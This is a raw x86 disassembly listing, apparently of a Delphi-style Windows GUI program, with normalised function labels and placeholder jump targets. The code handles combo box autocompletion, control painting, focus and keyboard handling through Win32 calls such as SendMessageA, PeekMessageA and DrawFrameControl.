mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_4478ac
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_4478d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447994
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f854
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_40460c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_44f884
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406d10
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44799b
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_4479a0
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447d58
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455038
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447d5f
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_4040d0
lea eax [ ebp - 0x44 ]
call sub_4040ac
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4040d0
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_44f854
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404100
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4040ac
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_4478ac
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_4478d8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40436c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c490
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_44f854
mov eax [ ebp - 0x38 ]
call sub_40436c
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4468d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40436c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40460c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40436c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40460c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44f854
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4468f8
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_4478ac
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4468d4
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c490
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404294
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_4043b8
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_4045cc
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404294
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_4043b8
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4468f8
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_4045cc
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_4045cc
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_4043b8
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_44f884
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406d10
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44f854
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404100
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_447d68
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404294
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_4043b8
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_447d68
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_447d68
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447f1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40436c
test eax eax
jne r-xdata
mov eax esi
call sub_40456c
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_4034ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447f24
lea eax [ ebp - 0x1c ]
call sub_4040ac
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4040d0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_404100
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_40436c
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_4045cc
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4043b8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_44f884
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x1c ]
call sub_40436c
push eax
mov eax esi
call sub_40436c
pop edx
call sub_406d10
push eax
push 0x0
push 0x142
mov eax ebx
call sub_456054
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4034ac
mov eax ebx
mov si 0xffb2
call sub_4034ac
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_447f50
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_4256c8
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_425568
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_425584
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_425224
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424bc0
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4243f4
xor edx edx
mov eax [ esi + 0x208 ]
call sub_4256c8
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_448028
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_448054
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_450ef0
mov eax ebx
call sub_44fa7c
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_466768
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44ff14
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44fa8c
sub_4480cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_446ec0
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_448128
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4541e4
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448351
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e430
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424bc0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_425260
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_425260
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44f1f4
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424bc0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_425260
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_425260
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_4468d4
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call DrawFrameControl
jmp r-xdata
sub_448364
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451d4c
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_448388
push ebx
mov ebx eax
mov eax ebx
call sub_45bebc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4483c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_448416
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_448424
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451d80
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_448478
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_456b24
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4484cc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4484f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_453a68
mov eax ebx
mov si 0xffb5
call sub_4034ac
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_456054
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_4034ac
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_448568
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_440198
mov ebx eax
mov eax ebx
call sub_440278
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_456054
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_440378
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4485b4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_440198
call sub_440278
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4544a8
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4485e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ee0
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_448618
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448424
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_44f010
mov edx 0x19
mov eax esi
call sub_44f034
mov dl 0x1
mov eax esi
call sub_456288
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4486a4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_456358
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_456054
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_456054
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4486f8
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_456358
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_466768
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_450a20
sub_44872c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4485e0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_452e0c
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_448794
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_4554d0
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_466670
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034ac
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448801
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44887a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4666f8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4554d8
mov eax ebx
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034ac
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448881
sub_448888
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_4554e0
pop edi
pop esi
pop ebx
retn
sub_4488dc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_440198
call sub_440278
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_448908
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_440198
mov ebx eax
mov eax ebx
call sub_440278
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_456054
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_440378
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448954
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448424
mov edx 0x71
mov eax esi
call sub_44f010
mov edx 0x11
mov eax esi
call sub_44f034
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4489bc
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4034ac
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4489fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_452d48
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_45c150
sub_448ab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456288
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
push ebp
call sub_4489fc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44f460
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4034ac
sub_448b44
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4485e0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_452e0c
mov eax ebx
mov si 0xffc8
call sub_4034ac
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
